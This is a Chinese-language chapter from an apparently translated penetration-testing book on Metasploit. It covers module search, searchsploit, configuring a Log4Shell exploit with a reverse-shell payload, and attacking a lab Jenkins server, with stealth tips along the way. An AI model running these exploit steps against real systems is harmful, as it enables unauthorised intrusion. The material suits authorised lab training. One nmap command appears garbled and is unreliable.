## 漏洞利用的乐趣

能够完全控制目标机器是一种很棒的感觉，甚至有点吓人。尽管如此，系统和网络防护的进步使得漏洞利用更加困难，因此渗透测试人员必须不断开发新技术。幸运的是，安全社区的成员经常更新 Metasploit 框架，因此它已成为一个惊人的漏洞利用库。本章将向你展示如何导航和利用这个不断扩展的仓库。

我们的目标是让你熟悉通过框架提供的不同命令，我们将在后续章节中以此为基础。我们将使用 MSFconsole 执行大多数攻击，因此如果需要快速复习，请参阅第 1 章和第 2 章。

## 基础漏洞利用

Metasploit 框架包含数百个模块，几乎不可能全部记住。在 MSFconsole 中运行 `show` 将显示框架中可用的每个模块，但你也可以通过仅显示特定类型的模块来缩小搜索范围：

- `show exploits` – 显示利用特定漏洞来获得机器访问权限的漏洞利用模块。新的漏洞利用一直在开发中，所以列表会不断增长。此命令将显示框架内当前可用的每个漏洞利用。
- `show auxiliary` – 显示 Metasploit 中的辅助模块，这些模块可用于广泛的目的。将在第 11 章中介绍，它们可以用作扫描器、拒绝服务模块、模糊测试器等。此命令将显示它们并列出其功能。
- `show options` – 显示控制框架模块各种设置的选项。当你在选中某个模块时运行 `show options`，Metasploit 将仅显示适用于该模块的选项。如果没有选中任何模块，输入 `show options` 将显示全局选项。例如，`LogLevel` 是全局选项之一，可以设置为 0 到 3 之间的值。在默认级别 0 时，不显示日志消息，而级别 3 是最高级别，显示所有日志消息。

## 搜索漏洞利用

在情报收集阶段，你绘制了目标网络的图谱并扫描了其中包含的机器。现在，你将使用这些信息在 Metasploit 框架中搜索与你发现的漏洞相关的漏洞利用。`search` 命令对于查找特定的漏洞利用、辅助模块和载荷非常有用。

搜索最新的漏洞利用是缩小结果范围的好方法，这些结果与新的漏洞相关联，这些漏洞不太可能已被修补。考虑这样一个场景：你发现目标网络中的一台机器正在运行 Apache Web 服务器。你可以通过运行以下命令来搜索 Metasploit 框架仓库中的 Apache 漏洞利用，将 `YYYY` 替换为当前或上一年：

```bash
msf > search name:apache type:exploit disclosure:YYYY-01-01
```

此搜索命令中使用了三个过滤器。`name` 过滤器搜索指定的字段。在此示例中，我们搜索包含 `apache` 的模块。第二个过滤器限制模块的类型。这里，我们只想要漏洞利用模块。最后一个过滤器将结果限制在特定年份的漏洞利用。

一些漏洞扫描器还会识别通用漏洞披露（CVE）ID。你可以使用 `cve` 过滤器按特定的 CVE ID 过滤模块。要获取与 `search` 命令关联的过滤器的完整列表，请运行 `help search`。

尝试搜索与你听说过的某个令人兴奋的新漏洞相关的漏洞利用。例如，以下是与一个名为 log4j 的易受攻击的 Java 日志库相关的漏洞利用：

```bash
msf > search log4j

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/log4shell_header_injection  2021-12-09       excellent  Yes    Log4Shell HTTP Header Injection
   1  auxiliary/scanner/http/log4shell_scanner       2021-12-09       normal     No     Log4Shell HTTP Scanner
   2  exploit/multi/http/ubiquiti_unifi_log4shell    2021-12-09       excellent  Yes    Ubiquiti UniFi Network Application Log4Shell
```

看起来 Metasploit 中提供了两个漏洞利用模块和一个与 log4j 漏洞关联的扫描器模块。在你读到这部分的时候，log4j 漏洞希望已经被修补了，但新的漏洞会被发现。

## searchsploit

如果你正在研究的漏洞、服务或应用程序还没有可用的 Metasploit 模块，你也可以直接从 MSFconsole 使用 `searchsploit` 工具搜索 Exploit DB 数据库：

```bash
msf > searchsploit log4j
[*] exec: searchsploit log4j

-----------------------------------------------------------------------------------------------------------
 Exploit Title                                                                              |  Path
-----------------------------------------------------------------------------------------------------------
Apache Log4j 2 - Remote Code Execution (RCE)                                                | java/remote/50592.py
Apache Log4j2 2.14.1 - Information Disclosure                                               | java/remote/50590.py
-----------------------------------------------------------------------------------------------------------
Shellcodes: No Results
Papers: No Results
```

该数据库包含可用于执行漏洞利用的代码。每个程序都标有一个唯一的编号，例如这里的 50592。你可以通过运行以下命令查看此漏洞利用的详细信息（`-p` 标志告诉 searchsploit 显示路径信息）：

```bash
msf > searchsploit -p 50592
[*] exec: searchsploit -p 50592

  Exploit: Apache Log4j 2 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50592
     Path: /usr/share/exploitdb/exploits/java/remote/50592.py
File Type: Python script, ASCII text executable
```

结果包括可以在其中找到漏洞利用代码的 URL 以及系统上漏洞利用代码的路径。需要注意的是，这些程序必须在 Metasploit 框架之外运行，但如果在 Metasploit 中找不到模块，`searchsploit` 是一个很好的选择。

## info

在运行漏洞利用之前，你应该了解它的工作原理。当 `show` 和 `search` 命令提供的模块简短描述不够充分时，使用 `info` 命令后跟模块名称来显示该模块可用的所有信息、选项和目标：

```bash
msf > info exploit/multi/http/log4shell_header_injection
```

你应该会看到描述该模块的信息页。让我们看一下 Log4Shell HTTP Header Injection 漏洞利用的这个信息页的一些重要部分：

```text
Name: Log4Shell HTTP Header Injection
Module: exploit/multi/http/log4shell_header_injection
Platform:
Arch:
Privileged: No
License: Metasploit Framework License (BSD)
Rank: Excellent
Provided by:
  Michael Schierl
  juan vazquez
  sinn3r
  Spencer McIntyre
  RageLtMan
```

`platform` 标签列出了可以使用该漏洞利用攻击的操作系统，例如 Windows、Linux 和 Android。这里，此选项为空，因为模块开发者没有指定对漏洞利用可攻击平台的限制。`arch` 标签指定模块所需的芯片架构。此选项这里也为空；该漏洞利用针对的是一个在多个平台和架构上运行的 Java 库中的漏洞。

`privileged` 标签指示模块是否需要或授予特权访问权限。提供特权访问的模块很有价值，因为它们可以在目标机器上为你提供 root 级别的权限。有了 root 权限，你可以更改密码、访问用户账户以及安装复杂的恶意软件，如 rootkit 和 bootkit。但请注意，此模块不提供特权访问。在第 6 章中，我们将讨论一旦获得对机器的访问权限后如何提升你的权限。

`rank` 是对模块可靠性的衡量。目标是使用排名最高的模块，即 `Excellent`。获得此评级的模块绝不能导致服务崩溃，也不应破坏内存。避免使用排名为 `Low` 或 `Manual` 的模块，因为这些模块很少成功，有时需要你手动配置它们。然而，在某些情况下，这些可能是特定软件版本唯一可用的漏洞利用。

`Provided by` 部分列出了模块作者的联系信息。在第 12、13 和 14 章中，我们将讨论如何编写 Metasploit 模块。谁知道呢？将来你可能会在这些模块上看到你的名字。

模块副作用部分很重要，因为对系统运行模块可能会留下痕迹。在此示例中，可以在日志中找到入侵指标（IoC），这可能会使系统管理员将攻击追溯回我们。如果我们想保持隐蔽，副作用越少越好。我们也希望模块稳定可靠，因此要密切注意这些部分：

```text
Module side effects: ioc-in-logs
Module stability: crash-safe
Module reliability: repeatable-session

Available targets:
   Id  Name
   --  ----
   0   Automatic
   1   Windows
   2   Linux

Description:
  Versions of Apache Log4j2 impacted...which allow
  JNDI features used in configuration, log messages, and parameters,
  do not protect against attacker controlled LDAP and other JNDI
  --snip--

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-44228

Related modules:
  auxiliary/scanner/http/log4shell_scanner
```

可用目标列表显示了可能易受该漏洞利用攻击的系统。我们将在下一节更详细地讨论这一点。描述部分提供了模块和相关漏洞的简要描述。

我们最喜欢的部分之一是 references。此部分通常包含一组链接，你可以在其中阅读有关漏洞或漏洞利用的更多信息。最后，相关模块部分列出了与当前模块相关的模块。这是查找其他漏洞利用或扫描器的好地方。

## 选择漏洞利用

所以，你已经完成了研究，找到了一个利用目标网络中服务的模块。通过输入 `use` 命令后跟模块路径来选择模块：

```bash
msf > use exploit/multi/http/log4shell_header_injection
```

请注意，当你发出命令时，msf 提示符会如下改变：

```text
msf exploit(multi/http/log4shell_header_injection) >
```

这表示你已经选择了 `log4shell_header_injection` 模块，并且在此提示符下发出的后续命令将在该漏洞利用下执行。

你可以在漏洞利用中随时运行 `search` 或 `use` 来切换到不同的漏洞利用或模块。你也可以在模块内部发出 `back` 命令返回上一级：

```bash
msf exploit(log4shell_header_injection) > back
msf >
```

当提示符反映你选择的模块时，输入以下命令以显示特定于 `log4shell_header_injection` 漏洞利用的选项：

## show payloads

回忆第 2 章，载荷是传递给目标的特定于平台的代码片段。对于基于 Windows 的漏洞利用，这些载荷可能就像在目标上启动的命令提示符一样简单。要查看活动载荷列表，请运行以下命令：

```bash
msf > show payloads
```

这会显示 Metasploit 中所有可用的载荷。但是，如果你在漏洞利用模块中运行相同的命令，你将只看到适用于该漏洞利用的载荷。让我们为 `log4shell_header_injection` 模块查找载荷：

```bash
msf exploit(log4shell_header_injection) > show payloads

Compatible Payloads
===================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  payload/generic/custom                             normal  No     Custom Payload
   1  payload/generic/shell_bind_tcp                     normal  No     Generic Command Shell...
   2  payload/generic/shell_reverse_tcp                  normal  No     Generic Command Shell...
   3  payload/generic/ssh/interact                       normal  No     Interact with Establi...
   --snip--
```

仔细选择你的载荷。你选择的代码必须能够在目标环境中运行。例如，如果目标机器运行的是 Windows，请选择 Windows 支持的载荷。

我们可以使用 `set` 命令来设置我们的载荷。这里，我们使用一个在 Java 环境中运行的载荷。我们知道目标支持 Java，因为我们正在利用一个 Java 库：

```bash
msf exploit(log4shell_header_injection) > set PAYLOAD java/shell_reverse_tcp
payload => java/shell_reverse_tcp
```

这个反向 shell 载荷将使目标机器发起连接，从而连接到特定 IP 地址上的攻击者机器。换句话说，不是攻击者机器连接到目标，而是目标连接到攻击者。你可以使用这种技术来绕过防火墙或 NAT 设备，这些设备可能会阻止来自网络外部的可疑连接请求。

如果你再次运行 `show options`，你会注意到此模块推荐了我们选择的载荷：

```bash
msf exploit(log4shell_header_injection) > show options

Payload options (java/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                    yes       The listen address (an interface may be...)
   LPORT  4444              yes       The listen port
```

现在，我们在载荷部分看到了额外的选项，例如 `LHOST` 和 `LPORT`。我们将同时设置 `LHOST` 和 `LPORT` 选项。`LHOST` 将设置为攻击者机器的 IP 地址：

```bash
msf exploit(log4shell_header_injection) > set LHOST <攻击者 IP 地址>
```

我们将 `LPORT` 保留在默认端口（4444）。但是，如果你想更隐蔽，可以将其更改为 TCP 常用端口 443。

## show targets

模块通常列出易受攻击的潜在目标。例如，在 msf `log4shell_header_injection` 提示符下使用 `show targets` 命令会显示三个漏洞利用目标的列表：

```bash
msf exploit(log4shell_header_injection) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   Windows
   2   Linux
```

你可以看到漏洞利用将自动定位列为一个选项。如果选择此项，该模块将尝试根据你所针对的服务和操作系统版本来选择漏洞利用。然而，最好自己尝试识别合适的漏洞利用。有时自动检测不起作用，甚至可能触发崩溃。

## set 和 unset

如果给定 Metasploit 模块的选项标记为 `required` 或 `yes`，则必须全部设置。使用 `set` 命令设置选项；使用 `unset` 关闭设置。以下示例展示了 `set` 和 `unset` 命令的使用：

```bash
msf exploit(multi/http/log4shell_header_injection) > set LHOST 10.0.2.41
LHOST => 10.0.2.41
msf exploit(multi/http/log4shell_header_injection) > show options
--snip--

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.41        yes       The listen address (an interface...)
   LPORT  4444             yes       The listen port
--snip--

msf exploit(multi/http/log4shell_header_injection) > unset LHOST
Unsetting LHOST...
```

请注意，变量使用大写字符引用。这不是必需的，但被认为是最佳实践。

我们将目标 IP 地址（`RHOSTS`）设置为要利用的机器的 IP 地址。运行 `show options` 确认我们的设置已被填充。

## setg 和 unsetg

`setg` 和 `unsetg` 命令在 MSFconsole 中全局设置或取消设置参数。使用这些命令可以避免重复输入相同的信息，特别是对于经常使用且很少更改的选项，例如 `LHOST`：

```bash
msf > setg LHOST 10.0.2.41
LHOST => 10.0.2.41
```

在此示例中，我们设置了监听主机的 IP 地址。

## save

使用 `setg` 命令配置全局选项后，使用 `save` 命令保存你当前的设置，以便下次运行控制台时它们可用。你可以在 Metasploit 中随时输入 `save` 命令来保存你当前的位置：

```bash
msf exploit(multi/http/log4shell_header_injection) > save
Saved configuration to: /root/.msf4/config
msf exploit(multi/http/log4shell_header_injection) >
```

屏幕上会显示配置存储的位置 `/root/.msf4/config`。如果出于某种原因需要重新开始，移动或删除此文件以恢复默认设置。

## exploit

一旦配置好模块，使用 `exploit` 或 `run` 命令，启动模块，并开始漏洞利用过程。在你执行此命令之前，模块中的代码不会运行。

## 攻击 Windows 机器

现在你已经了解了基础知识，包括如何在 MSFconsole 中设置变量，我们将使用 Kali Linux 中的 Metasploit 来攻击你在附录 A 中设置的 Windows 服务器。按照该附录中的说明启动该服务器。然后在 Kali 中，从 Metasploit 运行 nmap 开始：

```bash
kali@kali:~$ sudo msfconsole -q
msf > nmap -sT -Pn -A 192.168.1.102 -Pn-65355 -script=http-e num.nse

PORT     STATE SERVICE    VERSION
8383/tcp open  http       Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
8484/tcp open  http       Jetty winstone
| http-server-header: Jetty(winstone)
|_http-title: Dashboard [Jenkins]
| http-robots.txt: 1 disallowed entry
|_/
```

`-sT` 标志执行一个隐蔽的 TCP 连接，我们发现这是枚举端口最可靠的选项。（其他人更喜欢 `-sS`，即隐蔽 SYN 扫描。）`-A` 标志执行高级操作系统检测，其中涉及一些额外的横幅抓取和特定服务的识别。

随着你渗透测试技能的提高，发现某些开放端口会触发你关于如何利用特定服务的想法。通常，系统只运行几个应用程序，但你要利用的这台虚拟机被设计为包含多个易受攻击的服务。让我们在 Metasploit 中搜索一个模块，我们可以用它来攻击其中一个应用程序。

在真实场景中，你应该研究每个服务以检查它是否易受攻击。现在，让我们关注在端口 8484 上运行的应用程序。请注意，此端口与 Jenkins 服务器关联。Jenkins 服务器帮助软件开发人员自动化构建和测试软件的过程，可以在几家软件开发公司的服务器上找到。

让我们在 Metasploit 框架中搜索相关的漏洞利用：

```bash
msf > search jenkins type:exploit platform:windows

Matching Modules
================

   #  Name                                                    Rank       Check  Description
   -  ----                                                    ----       -----  -----------
   0  exploit/multi/http/ibm_websphere_java_deserialize       excellent  No     IBM WebSphere RCE
   1  exploit/multi/http/jenkins_xstream_deserialize          excellent  Yes    Jenkins XStream
   2  exploit/multi/http/jenkins_script_console               excellent  Yes    Jenkins XStream
   3  exploit/windows/http/jenkins_script_console             good       Yes    Jenkins- CI Script
```

每个漏洞利用都针对应用程序的特定版本和配置。花点时间阅读每一个，以确定哪一个最适合你的攻击场景。例如，假设我们在研究中犯了一个错误，因此选择了错误的漏洞利用模块；我们选择了漏洞利用 0，但它不起作用，我们收到以下消息：

```text
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Exploit completed, but no session was created.
```

消息告诉我们 Metasploit 启动了处理程序并在反向 shell 的连接上等待。然而，在完成与漏洞利用相关的步骤后，它无法创建会话并连接到载荷。模块失败是因为应用程序的版本和配置不易受该漏洞利用的攻击。

漏洞利用 2 适用于在 Windows 服务器上运行的 Jenkins 的版本和配置。一旦漏洞利用模块完成，我们将能够在目标机器的终端中远程执行命令。输入 `use` 命令选择漏洞利用 2，并使用 `set` 命令配置适当的选项。确保你设置了所有必需的选项，如下所示：

```bash
msf > use 2
[*] Using configured payload windows/meterpreter/reverse_tcp
msf exploit(multi/http/jenkins_script_console) > show options

Module options (exploit/multi/http/jenkins_script_console):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   API_TOKEN                      no        The API token for the specified username
   PASSWORD                       no        The password for the specified username
   Proxies                        no        A proxy chain of format...
   RHOSTS                         yes       The target host(s)
   RPORT         8484             yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host or network interface
   SRVPORT       8080             yes       The local port to listen on
```
